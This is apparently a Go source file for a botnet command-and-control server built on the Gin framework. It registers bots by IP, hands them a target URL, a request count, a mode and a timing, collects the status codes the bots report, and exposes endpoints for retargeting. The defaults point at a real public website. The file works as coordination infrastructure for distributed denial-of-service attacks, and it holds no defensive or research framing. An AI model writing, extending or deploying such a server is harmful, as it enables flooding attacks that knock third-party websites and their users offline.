package main

import (
	"fmt"
	"strconv"
	"time"

	"github.com/gin-contrib/cors"
	"github.com/gin-gonic/gin"
)

type BotnetServer struct {
	Status        bool
	ConnectedBots map[string]time.Time
	BotsResponses []BotStats
}

type BotStats struct {
	Target       string
	Status       []int
	ResponseTime time.Time
}

type BotStatsReqBody struct {
	Target string `json:"target"`
	Status []int  `json:"status"`
}

type TargetInfo struct {
	TargetUrl   string
	RequestNum  int
	Mode        string
	TimeSeconds int
}

type ServerStatusReqBody struct {
	Status bool `json:"status"`
}

type ChangeTargetReqBody struct {
	Target string `json:"target"`
}

type SetRequestsNumberReqBody struct {
	RequestsNumber int `json:"requestsNumber"`
}

type SetModeReqBody struct {
	Mode string `json:"mode"`
}

type SetTimeSecondsReqBody struct {
	TimeSeconds int `json:"timeSeconds"`
}

var targetInfo = TargetInfo{"https://theuselessweb.com/", 10, "timeMode", 1}
var botnetServer = BotnetServer{true, make(map[string]time.Time), []BotStats{}}
var PORT = 5000

func PostSendBotStats(c *gin.Context) {
	var botStatsResponse BotStatsReqBody
	err := c.ShouldBindJSON(&botStatsResponse)

	if err == nil {
		botStats := BotStats{targetInfo.TargetUrl, botStatsResponse.Status, time.Now()}
		botnetServer.BotsResponses = append(botnetServer.BotsResponses, botStats)

		c.JSON(200, botStatsResponse)
		fmt.Println(botnetServer.BotsResponses)
		return
	} else {
		c.JSON(500, gin.H{
			"messsage": "Error getting bot stats",
		})
		return
	}
}

func GetTargetInfo(c *gin.Context) {
	botnetServer.ConnectedBots[c.ClientIP()] = time.Now()

	c.JSON(200, gin.H{
		"status":      botnetServer.Status,
		"targetUrl":   targetInfo.TargetUrl,
		"requestNum":  targetInfo.RequestNum,
		"mode":        targetInfo.Mode,
		"timeSeconds": targetInfo.TimeSeconds,
	})
}

func SetServerStatus(c *gin.Context) {
	var serverStatusReqBody ServerStatusReqBody
	err := c.ShouldBindJSON(&serverStatusReqBody)

	if err == nil {
		botnetServer.Status = serverStatusReqBody.Status

		c.JSON(200, gin.H{
			"message": "Server status has been set to " + strconv.FormatBool(serverStatusReqBody.Status),
		})
		return
	} else {
		c.JSON(500, gin.H{
			"messsage": "Oops, error while setting server status",
		})
		return
	}
}

func GetServerStatus(c *gin.Context) {
	c.JSON(200, gin.H{
		"status": botnetServer.Status,
	})
}

func ChangeTarget(c *gin.Context) {
	var changeTargetReqBody ChangeTargetReqBody
	err := c.ShouldBindJSON(&changeTargetReqBody)

	if err == nil {
		targetInfo.TargetUrl = changeTargetReqBody.Target

		c.JSON(200, gin.H{
			"message": "Target has been set to " + changeTargetReqBody.Target,
		})
		return
	} else {
		c.JSON(500, gin.H{
			"messsage": "Oops, error while changin target",
		})
		return
	}
}

func GetConnectedBots(c *gin.Context) {
	connectedBots := []string{}

	for botIp, lastConnectionTime := range botnetServer.ConnectedBots {
		activeConnectionTimeBound := time.Now().Add(-10 * time.Minute)

		if !lastConnectionTime.Before(activeConnectionTimeBound) {
			connectedBots = append(connectedBots, botIp)
		}
	}

	c.JSON(200, gin.H{
		"connectedBots": connectedBots,
	})
}

func GetBotsStats(c *gin.Context) {
	c.JSON(200, gin.H{
		"stats": botnetServer.BotsResponses,
	})
}

func SetRequestsNumber(c *gin.Context) {
	var setRequestsNumberReqBody SetRequestsNumberReqBody
	err := c.ShouldBindJSON(&setRequestsNumberReqBody)

	if err == nil {
		targetInfo.RequestNum = setRequestsNumberReqBody.RequestsNumber

		c.JSON(200, gin.H{
			"message": "Requests number has been set to " + strconv.Itoa(setRequestsNumberReqBody.RequestsNumber),
		})
		return
	} else {
		c.JSON(500, gin.H{
			"messsage": "Oops, error while setting requests number",
		})
		return
	}
}

func SetTimeSeconds(c *gin.Context) {
	var setTimeSecondsReqBody SetTimeSecondsReqBody
	err := c.ShouldBindJSON(&setTimeSecondsReqBody)

	if err == nil {
		targetInfo.TimeSeconds = setTimeSecondsReqBody.TimeSeconds

		c.JSON(200, gin.H{
			"message": "TimeSeconds has been set to " + strconv.Itoa(setTimeSecondsReqBody.TimeSeconds),
		})
		return
	} else {
		c.JSON(500, gin.H{
			"messsage": "Oops, error while setting timeSeconds",
		})
		return
	}
}

func SetMode(c *gin.Context) {
	var setModeReqBody SetModeReqBody
	err := c.ShouldBindJSON(&setModeReqBody)

	if err == nil {
		if setModeReqBody.Mode == "requestMode" || setModeReqBody.Mode == "timeMode" {
			targetInfo.Mode = setModeReqBody.Mode

			c.JSON(200, gin.H{
				"message": "Mode has been set to " + setModeReqBody.Mode,
			})
			return
		}

		c.JSON(404, gin.H{
			"message": "Invalid mode value",
		})
		return

	} else {
		c.JSON(500, gin.H{
			"messsage": "Oops, error while setting mode",
		})
		return
	}
}

func main() {
	server := gin.Default()
	server.Use(cors.Default())

	server.GET("/getTargetInfo", GetTargetInfo)
	server.GET("/getServerStatus", GetServerStatus)
	server.GET("/getConnectedBots", GetConnectedBots)
	server.GET("/getBotsStats", GetBotsStats)
	server.POST("/sendBotStat", PostSendBotStats)
	server.POST("/setServerStatus", SetServerStatus)
	server.POST("/changeTarget", ChangeTarget)
	server.POST("/setRequestsNumber", SetRequestsNumber)
	server.POST("/setMode", SetMode)
	server.POST("/setTimeSeconds", SetTimeSeconds)

	server.Run(":" + strconv.Itoa(PORT))
}
